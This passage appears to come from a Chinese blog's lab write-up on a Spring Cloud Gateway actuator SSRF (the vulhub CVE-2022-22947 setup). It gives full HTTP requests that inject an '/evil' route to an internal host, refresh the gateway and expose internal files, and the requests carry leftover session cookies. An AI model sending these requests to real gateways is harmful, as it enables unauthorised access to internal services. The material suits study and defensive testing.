&quot;http://192.168.1.247:8888/&quot;,</span><br><span class="line">  &quot;order&quot;: -1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020250103231628.png" alt="Pasted image 20250103231628.png"></p>
<p>出现201即成功</p>
<p>刷新配置:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: csrftoken=OM3FxDI0M4njXhH0zVNJtCGRfdK3yRmZINRnazGlPHBJ7gXQ1SgmGh9AofjMsomi; rememberMe=UbyG+puy2EL1Yunmn7gz8Ymrg5p9w6q7bHzTbk+SIDR13mgYzmv/iMmA9RylIE3rgt3FG3FkXIU54cNvsefZxuPV9YU0Tp+vnbtt2VlmSIxV55FVb7PvDJ3aPIz7EF2A5tXeQ2bx+sEFDuTPKFVhRjtrblyBX/OrrbRG5MSURTWGQVDpZlvJ5bJ1jf2JAy5yCLmk9mrUzqaEmaRDKi2oFzNd9jV9qIz2yeVtZ3jJsIX2ZlKr4tVGBxK+gA3ldAnj/G5P/iU8RltCVWusuXOvhZJfwQjBtJeSTaj9PN0W1mu5fbJdY2qiTwgdpGfOeUxZZXG5sqaFRxSKuE7NpgHi74UoVR+BUg3tazhqL40MzQ3sKcz8BT3H7uftxDvr7JNC2jGXOy4dhFRM4ph+LPp1XhcwSP1V1I8wwacat7wks877f29ZYzp9nyEGqMndzKC/XUSJ8UIIsb574B+p2wltNzTSbuxgnVu/QFVVkx33fQPd8qfEh5AYrfI62zgj77Ql; _ga_0WLTHS96P4=GS1.1.1712136317.1.1.1712136329.0.0.0; _ga=GA1.1.737516964.1712136317; CactiDateTime=Tue Jul 16 2024 16:24:46 GMT+0800 (ä¸­å½æ åæ¶é´); CactiTimeZone=480; _ga_P1E9Z5LRRK=GS1.1.1725342668.1.0.1725343017.0.0.0; cookie_token=cc04b17c8e9948cd4ae7e5a62e6aaab84e806df77a171b2d761526e2f0b07537; Drupal.toolbar.collapsed=0; wp-settings-time-1=1734415947</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 233</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;predicate&quot;: &quot;Paths: [/evil], match trailing slash: true&quot;,</span><br><span class="line">  &quot;route_id&quot;: &quot;new_route&quot;,</span><br><span class="line">  &quot;filters&quot;: [</span><br><span class="line">    &quot;[[RewritePath /evil(?&lt;path&gt;.*) = /$&#123;path&#125;], order = 1]&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;uri&quot;: &quot;http://192.168.1.247:8888/&quot;,</span><br><span class="line">  &quot;order&quot;: -1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>返回200即成功</p>
<p>访问/actuator/gateway/routes可以发现新加的路由<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250103231752.png" alt="image.png"></p>
<p>我们把order设置为-1,因此在最上面<br>访问python内网服务: <a href="http://127.0.0.1:8080/evil/">http://127.0.0.1:8080/evil/</a><br>![[Pasted image 20250103231534.png]]<br>可以看到成功出现内网文件信息</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/vulhub/vulhub/tree/178719be6744a620ff0de125353789288657c2dd/spring/CVE-2022-22947">https://github.com/vulhub/vulhub/tree/178719be6744a620ff0de125353789288657c2dd/spring/CVE-2022-22947</a></li>
<li><a href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/">https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/</a></li>
</ul>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
</search>
